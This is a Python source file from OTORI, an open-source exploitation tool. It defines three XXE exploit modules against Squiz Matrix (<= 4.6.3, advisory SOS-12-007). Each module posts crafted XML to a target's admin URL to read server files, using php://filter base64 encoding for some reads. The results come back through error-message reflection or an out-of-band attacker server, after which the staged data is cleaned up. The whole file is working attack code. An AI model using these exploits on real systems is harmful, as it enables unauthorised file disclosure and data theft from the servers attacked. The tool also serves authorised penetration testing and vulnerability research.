#!/usr/bin/python

# On The Outside, Reaching In ("OTORI")
# Copyright 2014 Ben Lincoln
# http://www.beneaththewaves.net/
#

# This file is part of On The Outside, Reaching In ("OTORI").

# On The Outside, Reaching In ("OTORI") is free software: you can redistribute it and/or modify
# it under the terms of version 3 of the GNU General Public License as published by
# the Free Software Foundation.

# On The Outside, Reaching In ("OTORI") is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with On The Outside, Reaching In ("OTORI") (in the file LICENSE.txt).  
# If not, see <http://www.gnu.org/licenses/>.

import base64
import httplib
import inspect
import json
import os
import random
import re
import sys
import urllib

import libdeceitfulhttp
import liboutput
import libxxeexploits


# base class for exploits related to the Squiz Matrix vulnerabilities detailed in SOS-12-007
#	http://www.senseofsecurity.com.au/advisories/SOS-12-007
class XXESquizMatrixSOS12007(libxxeexploits.XXEHTTP):
	def __init__(self, uid, name):
		libxxeexploits.XXEHTTP.__init__(self, uid, name)
		
# SOS-12-007 - Squiz Matrix - Yunusov-Osipov-style exploit using direct read from an error message returned by the server
# Invalid URI (non-base64-encoded) variation
class XXESquizMatrixSOS12007YUIU(XXESquizMatrixSOS12007):
	def __init__(self):
		uid = "SOS-12-007-YU-IU"
		name = "Squiz Matrix (<= 4.6.3) - SOS-12-007 - Yunusov-Osipov-style exploit using error message reflection (invalid URI)"
		XXESquizMatrixSOS12007.__init__(self, uid, name)
		self.AddNextOption('SquizAdminURL', 'Squiz Administration URL (e.g. http://targetserver/_admin/)', None, True)
		self.AddNextOption('SquizURLAction', 'The value to send in the SQ_ACTION URL parameter', 'asset_map_request', False)
		self.AddNextOption('SquizCommandAction', 'The value to send as the action attribute of the "command" XML tag', 'get translations', False)
		self.RequiresSWAMM = True
		self.NonexistentURIStem = '{0}'.format(liboutput.OutputUtils.GenerateRandomMixedCaseAlphaNumericChars(4))
	def SetOptionsFromCommandLineArgs(self, args):
		self.SetRequiredParameter(args, 'SquizAdminURL', 0)
		self.SetOptionalParameter(args, 'SquizURLAction', 1)
		self.SetOptionalParameter(args, 'SquizCommandAction', 2)
		
	def SendXXEMessage(self, messageVariables, isSystemEntity):
		messageVariables['%SQUIZCOMMANDACTION%'] = self.GetOptionByName('SquizCommandAction').CurrentValue
		# this module deliberately uses an invalid URL for the "write" URL so that a 404 is returned
		messageVariables['%SWAMMWRITEURL%'] = '{0}{1}'.format(self.SWAMMURLs.BaseURL, self.NonexistentURIStem)
		
		reflectedFullURL = '{0}{1}'.format(self.SWAMMURLs.BaseURL, self.SWAMMReflectedXMLFileName)
		self.LogDebug('Using SWAMM URI stem "{0}" to stage Yunusov-Osipov XML fragment - full URL will be "{1}"'.format(self.SWAMMReflectedXMLFileName, reflectedFullURL))
		messageVariables['%SWAMMSTOREDREQUESTID%'] = self.SWAMMReflectedXMLFileName
		
		xmlFragTemplate = self.GetYunusovOsipovType2ReflectedXXEDefinitionTemplateBlock()
		xmlFrag = self.ActualizeTemplate(xmlFragTemplate, messageVariables)
		
		xmlFragResponse = libdeceitfulhttp.HTTPResponse()
		xmlFragResponse.ResponseCode = 200
		xmlFragResponse.ResponseReason = "OK"
		xmlFragResponse.AddOrReplaceHeader('Content-Type', 'text/xml')
		xmlFragResponse.Body = xmlFrag
		
		#self.SWAMMStoreBasicRequestResponsePair(self.SWAMMStoredRequestID, '/{0}'.format(self.SWAMMReflectedXMLFileName), None, xmlFragResponse)
		self.SWAMMStoreBasicRequestResponsePair(self.SWAMMStoredRequestID, '/{0}'.format(self.SWAMMReflectedXMLFileName), None, xmlFragResponse)
		
		xxexmlmessage = self.GetModuleDataFile('xxe-01.txt')
		
		messageVariables['%YUNUSOVOSIPOVBLOCK%'] = self.GetYunusovOsipovType2MainXXEDefinitionTemplateBlock()
		
		xxexmlmessage = self.ActualizeTemplate(xxexmlmessage, messageVariables)
		
		httpHeaders = self.GetStandardHTTPHeaders()
		httpHeaders['Accept'] = 'application/xhtml+xml,application/xml'
		httpHeaders['Content-Type'] = 'text/xml'
		targetURL = '{0}?SQ_ACTION={1}'.format(self.GetOptionByName('SquizAdminURL').CurrentValue, self.GetOptionByName('SquizURLAction').CurrentValue)
		response = self.SendRequest("POST", targetURL, xxexmlmessage, httpHeaders)
		result = self.ParseDelimitedResponse(messageVariables, response, libxxeexploits.ResponseParserSettingsPHP(), delimiterText = messageVariables['%SHORTDELIMITER%'])
		return result
		
		
# SOS-12-007 - Squiz Matrix - Yunusov-Osipov-style exploit using direct read from an error message returned by the server
# deliberately non-existent target URL variation
class XXESquizMatrixSOS12007YU404(XXESquizMatrixSOS12007):
	def __init__(self):
		uid = "SOS-12-007-YU-404"
		name = "Squiz Matrix (<= 4.6.3) - SOS-12-007 - Yunusov-Osipov-style exploit using error message reflection (nonexistent referenced page)"
		XXESquizMatrixSOS12007.__init__(self, uid, name)
		self.AddNextOption('SquizAdminURL', 'Squiz Administration URL (e.g. http://targetserver/_admin/)', None, True)
		self.AddNextOption('SquizURLAction', 'The value to send in the SQ_ACTION URL parameter', 'asset_map_request', False)
		self.AddNextOption('SquizCommandAction', 'The value to send as the action attribute of the "command" XML tag', 'get translations', False)
		self.RequiresSWAMM = True
		self.NonexistentURIStem = '{0}'.format(liboutput.OutputUtils.GenerateRandomMixedCaseAlphaNumericChars(4))
	def SetOptionsFromCommandLineArgs(self, args):
		self.SetRequiredParameter(args, 'SquizAdminURL', 0)
		self.SetOptionalParameter(args, 'SquizURLAction', 1)
		self.SetOptionalParameter(args, 'SquizCommandAction', 2)
		
	def SendXXEMessage(self, messageVariables, isSystemEntity):
		# if a file is being requested, base64-encode its contents
		if (isSystemEntity):
			#messageVariables['%URIPREFIX%'] = 'php://filter/read=convert.base64-encode/resource='
			messageVariables['%XXETARGET%'] = 'php://filter/read=convert.base64-encode/resource=' + messageVariables['%XXETARGET%']

		messageVariables['%SQUIZCOMMANDACTION%'] = self.GetOptionByName('SquizCommandAction').CurrentValue
		# this module deliberately uses an invalid URL for the "write" URL so that a 404 is returned
		messageVariables['%SWAMMWRITEURL%'] = '{0}{1}'.format(self.SWAMMURLs.BaseURL, self.NonexistentURIStem)
		
		reflectedFullURL = '{0}{1}'.format(self.SWAMMURLs.BaseURL, self.SWAMMReflectedXMLFileName)
		self.LogDebug('Using SWAMM URI stem "{0}" to stage Yunusov-Osipov XML fragment - full URL will be "{1}"'.format(self.SWAMMReflectedXMLFileName, reflectedFullURL))
		messageVariables['%SWAMMSTOREDREQUESTID%'] = self.SWAMMReflectedXMLFileName
		
		xmlFragTemplate = self.GetYunusovOsipovType2ReflectedXXEDefinitionTemplateBlock()
		xmlFrag = self.ActualizeTemplate(xmlFragTemplate, messageVariables)
		
		xmlFragResponse = libdeceitfulhttp.HTTPResponse()
		xmlFragResponse.ResponseCode = 200
		xmlFragResponse.ResponseReason = "OK"
		xmlFragResponse.AddOrReplaceHeader('Content-Type', 'text/xml')
		xmlFragResponse.Body = xmlFrag
		
		self.SWAMMStoreBasicRequestResponsePair(self.SWAMMStoredRequestID, '/{0}'.format(self.SWAMMReflectedXMLFileName), None, xmlFragResponse)
		
		xxexmlmessage = self.GetModuleDataFile('xxe-01.txt')
		
		messageVariables['%YUNUSOVOSIPOVBLOCK%'] = self.GetYunusovOsipovType2MainXXEDefinitionTemplateBlock()
		
		xxexmlmessage = self.ActualizeTemplate(xxexmlmessage, messageVariables)
		
		httpHeaders = self.GetStandardHTTPHeaders()
		httpHeaders['Accept'] = 'application/xhtml+xml,application/xml'
		httpHeaders['Content-Type'] = 'text/xml'
		targetURL = '{0}?SQ_ACTION={1}'.format(self.GetOptionByName('SquizAdminURL').CurrentValue, self.GetOptionByName('SquizURLAction').CurrentValue)
		response = self.SendRequest("POST", targetURL, xxexmlmessage, httpHeaders)
		result = self.ParseDelimitedResponse(messageVariables, response, libxxeexploits.ResponseParserSettingsPHP(), delimiterText = messageVariables['%SHORTDELIMITER%'], base64DecodeBody = True)
		return result
		
# SOS-12-007 - Squiz Matrix - Yunusov-Osipov-style exploit using fully out-of-band data retrieval
class XXESquizMatrixSOS12007YUOOB(XXESquizMatrixSOS12007):
	def __init__(self):
		uid = "SOS-12-007-YU-OOB"
		name = "Squiz Matrix (<= 4.6.3) - SOS-12-007 - Yunusov-Osipov-style exploit using fully out-of-band data retrieval"
		XXESquizMatrixSOS12007.__init__(self, uid, name)
		self.AddNextOption('SquizAdminURL', 'Squiz Administration URL (e.g. http://targetserver/_admin/)', None, True)
		self.AddNextOption('SquizURLAction', 'The value to send in the SQ_ACTION URL parameter', 'asset_map_request', False)
		self.AddNextOption('SquizCommandAction', 'The value to send as the action attribute of the "command" XML tag', 'get translations', False)
		self.RequiresSWAMM = True
	def SetOptionsFromCommandLineArgs(self, args):
		self.SetRequiredParameter(args, 'SquizAdminURL', 0)
		self.SetOptionalParameter(args, 'SquizURLAction', 1)
		self.SetOptionalParameter(args, 'SquizCommandAction', 2)
		
	def SendXXEMessage(self, messageVariables, isSystemEntity):
		# if a file is being requested, base64-encode its contents
		if (isSystemEntity):
			#messageVariables['%URIPREFIX%'] = 'php://filter/read=convert.base64-encode/resource='
			messageVariables['%XXETARGET%'] = 'php://filter/read=convert.base64-encode/resource=' + messageVariables['%XXETARGET%']

		messageVariables['%SQUIZCOMMANDACTION%'] = self.GetOptionByName('SquizCommandAction').CurrentValue
		
		reflectedFullURL = '{0}{1}'.format(self.SWAMMURLs.BaseURL, self.SWAMMReflectedXMLFileName)
		self.LogDebug('Using SWAMM URI stem "{0}" to stage Yunusov-Osipov XML fragment - full URL will be "{1}"'.format(self.SWAMMReflectedXMLFileName, reflectedFullURL))
		messageVariables['%SWAMMSTOREDREQUESTID%'] = self.SWAMMReflectedXMLFileName
		
		xmlFragTemplate = self.GetYunusovOsipovType2ReflectedXXEDefinitionTemplateBlock()
		xmlFrag = self.ActualizeTemplate(xmlFragTemplate, messageVariables)
		
		xmlFragResponse = libdeceitfulhttp.HTTPResponse()
		xmlFragResponse.ResponseCode = 200
		xmlFragResponse.ResponseReason = "OK"
		xmlFragResponse.AddOrReplaceHeader('Content-Type', 'text/xml')
		xmlFragResponse.Body = xmlFrag
		
		self.SWAMMStoreBasicRequestResponsePair(self.SWAMMStoredRequestID, '/{0}'.format(self.SWAMMReflectedXMLFileName), None, xmlFragResponse)
		
		xxexmlmessage = self.GetModuleDataFile('xxe-01.txt')
		
		messageVariables['%YUNUSOVOSIPOVBLOCK%'] = self.GetYunusovOsipovType2MainXXEDefinitionTemplateBlock()
		
		xxexmlmessage = self.ActualizeTemplate(xxexmlmessage, messageVariables)
		
		# Trigger the XXE in Squiz
		httpHeaders = self.GetStandardHTTPHeaders()
		httpHeaders['Accept'] = 'application/xhtml+xml,application/xml'
		httpHeaders['Content-Type'] = 'text/xml'
		targetURL = '{0}?SQ_ACTION={1}'.format(self.GetOptionByName('SquizAdminURL').CurrentValue, self.GetOptionByName('SquizURLAction').CurrentValue)
		response1 = self.SendRequest("POST", targetURL, xxexmlmessage, httpHeaders)
		
		# retrieve the OOB data from SWAMM
		targetURL = '{0}{1}'.format(self.SWAMMURLs.ReadURL, self.SWAMMReceiverID)
		self.LogDebug('Target URL for out-of-band read is "{0}"'.format(targetURL))
		response2 = self.SendRequest("GET", targetURL, None, httpHeaders)
		
		if (response2.ResponseCode != 200):
			self.LogWarning('Got a response code of {0} instead of 200 when trying to read the data for "{1}" from SWAMM'.format(response2.ResponseCode, messageVariables['%XXETARGET%']))
			result = self.ParseDelimitedResponse(messageVariables, response1, libxxeexploits.ResponseParserSettingsPHP(), delimiterText = messageVariables['%SHORTDELIMITER%'], base64DecodeBody = True)
			#raise libxxeexploits.XXEModuleError('Got a response code of {0} instead of 200'.format(response2.ResponseCode))
			return result
		else:
			result = self.ParseDelimitedResponse(messageVariables, response2, libxxeexploits.ResponseParserSettingsPHP(), delimiterText = messageVariables['%SHORTDELIMITER%'], base64DecodeBody = True)

			# delete the OOB data now that it's been retrieved
			targetURL = '{0}{1}'.format(self.SWAMMURLs.DeleteURL, self.SWAMMReceiverID)
			self.LogDebug('Target URL for out-of-band data delete is "{0}"'.format(targetURL))
			response3 = self.SendRequest("GET", targetURL, None, httpHeaders)
			
			# double-check to make sure it's really deleted
			targetURL = '{0}{1}'.format(self.SWAMMURLs.ReadURL, self.SWAMMReceiverID)
			self.LogDebug('Target URL for OOB read is "{0}"'.format(targetURL))
			response2 = self.SendRequest("GET", targetURL, None, httpHeaders)
			
			if (response2.ResponseCode == 404):
				self.LogDebug('Out-of-band data was successfully deleted from the SWAMM instance')
			else:
				self.LogWarning('The out-of-band data at "{0}" was not successfully deleted from the SWAMM instance - there is a small chance that this may cause inaccurate results for other files downloaded during this session'.format(self.SWAMMURLs.ReadURL))
			return result
			
		return result